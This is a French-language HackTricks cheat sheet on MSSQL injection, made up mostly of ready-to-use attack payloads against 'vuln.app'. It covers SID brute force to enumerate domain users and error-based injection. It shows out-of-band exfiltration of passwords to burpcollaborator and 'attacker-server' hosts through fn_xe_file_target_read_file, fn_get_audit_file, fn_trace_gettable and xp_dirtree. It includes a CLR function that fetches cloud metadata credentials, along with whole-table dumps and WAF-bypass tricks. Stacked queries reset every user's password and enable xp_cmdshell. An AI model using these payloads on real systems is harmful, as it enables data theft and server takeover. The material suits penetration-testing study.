# Injection MSSQL

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## √ânum√©ration de l'Active Directory

Il peut √™tre possible de **√©num√©rer les utilisateurs de domaine via une injection SQL √† l'int√©rieur d'un serveur MSSQL** en utilisant les fonctions MSSQL suivantes :

* **`SELECT DEFAULT_DOMAIN()`** : Obtenez le nom de domaine actuel.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`** : Si vous connaissez le nom du domaine (_DOMAIN_ dans cet exemple), cette fonction retournera le **SID de l'utilisateur Administrateur** au format hexad√©cimal. Cela ressemblera √† `0x01050000000[...]0000f401`, notez comment les **4 derniers octets** sont le nombre **500** au format **big endian**, qui est l'**ID commun de l'utilisateur administrateur**.\
Cette fonction vous permettra de **conna√Ætre l'ID du domaine** (tous les octets sauf les 4 derniers).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Cette fonction retournera le **nom d'utilisateur de l'ID indiqu√©** (s'il y en a un), dans ce cas **0000e803** en big endian == **1000** (g√©n√©ralement c'est l'ID du premier ID d'utilisateur r√©gulier cr√©√©). Ensuite, vous pouvez imaginer que vous pouvez forcer brutalement les ID d'utilisateurs de 1000 √† 2000 et probablement obtenir tous les noms d'utilisateur des utilisateurs du domaine. Par exemple en utilisant une fonction comme la suivante :
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Vecteurs alternatifs bas√©s sur les erreurs**

Les injections SQL bas√©es sur les erreurs ressemblent typiquement √† des constructions telles que `+AND+1=@@version--` et des variantes bas√©es sur l'op√©rateur ¬´OR¬ª. Les requ√™tes contenant de telles expressions sont g√©n√©ralement bloqu√©es par les WAFs. Pour contourner cela, concat√©nez une cha√Æne en utilisant le caract√®re %2b avec le r√©sultat d'appels de fonctions sp√©cifiques qui d√©clenchent une erreur de conversion de type de donn√©es sur les donn√©es recherch√©es.

Voici quelques exemples de telles fonctions :

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Exemple d'utilisation de la fonction `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
## SSRF

### `fn_xe_file_target_read_file`
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**Permissions :** N√©cessite la permission **`VIEW SERVER STATE`** sur le serveur.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**Permissions :** N√©cessite la permission **`CONTROL SERVER`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettable`
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**Permissions :** N√©cessite la permission **`CONTROL SERVER`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

La m√©thode la plus courante pour effectuer un appel r√©seau que vous rencontrerez en utilisant MSSQL est l'utilisation de la Proc√©dure Stock√©e `xp_dirtree`, qui est curieusement non document√©e par Microsoft, ce qui a conduit √† ce qu'elle soit [document√©e par d'autres personnes sur Internet](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/). Cette m√©thode a √©t√© utilis√©e dans [plusieurs exemples](https://www.notsosecure.com/oob-exploitation-cheatsheet/) de billets sur l'[exfiltration de donn√©es hors bande](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) sur Internet.

Essentiellement,
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
Comme la fonction `LOAD_FILE` de MySQL, vous pouvez utiliser `xp_dirtree` pour effectuer une requ√™te r√©seau **uniquement sur le port TCP 445**. Vous ne pouvez pas contr√¥ler le num√©ro de port, mais pouvez lire des informations depuis des partages r√©seau.

**PS :** Cela ne fonctionne pas sur `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` install√© sur un `Windows Server 2016 Datacenter` dans la configuration par d√©faut.

Il existe **d'autres** proc√©dures stock√©es *** [**comme `master..xp_fileexist`**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) ou **`xp_subdirs`** qui peuvent √™tre utilis√©es pour des r√©sultats similaires.

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

√âvidemment, vous pourriez √©galement utiliser **`xp_cmdshell`** pour **ex√©cuter** quelque chose qui d√©clenche un **SSRF**. Pour plus d'informations, **lisez la section pertinente** de la page :

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL Fonction D√©finie par l'Utilisateur - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Il est assez simple d'√©crire une **CLR UDF** (Fonction D√©finie par l'Utilisateur en Common Language Runtime - code √©crit avec l'un des langages **.NET** et compil√© en **DLL**) et de **la charger dans MSSQL pour des fonctions personnalis√©es**. Cela n√©cessite cependant un acc√®s `dbo`, donc cela peut ne pas fonctionner √† moins que l'application web ne se connecte √† la base de donn√©es **en tant que `sa` ou avec un r√¥le d'Administrateur**.

[Ce d√©p√¥t Github contient le projet Visual Studio et les instructions d'installation](https://github.com/infiniteloopltd/SQLHttp) pour charger le binaire dans MSSQL en tant qu'assemblage CLR, puis invoquer des requ√™tes HTTP GET depuis MSSQL.

Le code `http.cs` utilise la classe `WebClient` pour effectuer une requ√™te GET et r√©cup√©rer le contenu comme sp√©cifi√©
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
Dans les instructions d'installation, ex√©cutez ce qui suit avant la requ√™te `CREATE ASSEMBLY` pour ajouter le hachage SHA512 de l'assembl√©e √† la liste des assembl√©es de confiance sur le serveur (vous pouvez voir la liste en utilisant `select * from sys.trusted_assemblies;`)
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Une fois l'assemblage ajout√© et la fonction cr√©√©e, nous pouvons ex√©cuter ce qui suit pour effectuer nos requ√™tes HTTP
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
## **Exploitation rapide : Extraire une table enti√®re en une seule requ√™te**

Il existe deux m√©thodes simples pour extraire le contenu complet d'une table en une seule requ√™te ‚Äî l'utilisation de la clause FOR XML ou de la clause FOR JSON. La clause FOR XML n√©cessite un mode sp√©cifi√© tel que ¬´ raw ¬ª, donc en termes de concision, FOR JSON est plus performant.

La requ√™te pour extraire le sch√©ma, les tables et les colonnes de la base de donn√©es actuelle :
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
```markdown
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

Les vecteurs bas√©s sur les erreurs n√©cessitent un alias ou un nom, car la sortie des expressions sans l'un ou l'autre ne peut pas √™tre format√©e en JSON.
```
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
```markdown
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **R√©cup√©ration de la requ√™te actuelle**

La requ√™te SQL actuellement ex√©cut√©e peut √™tre r√©cup√©r√©e en acc√©dant √† `sys.dm_exec_requests` et `sys.dm_exec_sql_text` :
```
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

**Permissions :** Si l'utilisateur dispose de la permission VIEW SERVER STATE sur le serveur, il verra toutes les sessions en cours d'ex√©cution sur l'instance de SQL Server ; sinon, l'utilisateur ne verra que la session actuelle.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **Petites astuces pour contourner les WAF**

Caract√®res d'espacement non standard : %C2%85 ou %C2%A0 :
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
Notation scientifique (0e) et hexad√©cimale (0x) pour l'obfuscation de UNION :
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
Un point au lieu d'un espace blanc entre FROM et le nom d'une colonne :
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
S√©parateur \N entre SELECT et une colonne sans importance :
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### Contournement de WAF avec des requ√™tes empil√©es non orthodoxes

Selon [**ce billet de blog**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/), il est possible d'empiler des requ√™tes dans MSSQL sans utiliser ";":

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Donc, par exemple, plusieurs requ√™tes telles que :
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
Peut √™tre r√©duit √† :
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
Par cons√©quent, il pourrait √™tre possible de contourner diff√©rents WAFs qui ne prennent pas en compte cette forme d'empilement de requ√™tes. Par exemple :
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## R√©f√©rences

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
